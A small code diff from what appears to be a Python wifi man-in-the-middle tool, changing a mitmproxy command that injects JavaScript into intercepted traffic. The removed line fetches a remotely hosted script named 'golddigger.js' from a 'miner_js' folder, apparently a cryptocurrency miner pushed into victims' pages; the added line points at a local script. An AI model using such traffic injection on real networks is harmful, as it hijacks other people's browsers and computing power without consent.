@@ -8,7 +8,7 @@ def start_mitm():
     pass
     
 def get_cert(path, basename):
-    os.system("~/.local/bin/mitmproxy -s 'cert *=cert.pem' 'injector.py https://github.com/johnbomba/wifi_m/blob/master/miner_js/golddigger.js' -T")
+    os.system("~/.local/bin/mitmproxy -p port_number -s 'cert *=cert.pem' 'src/injector.py src/js/script.js' -T")
     pass
 
 def get_stats(secret_key, params={}):
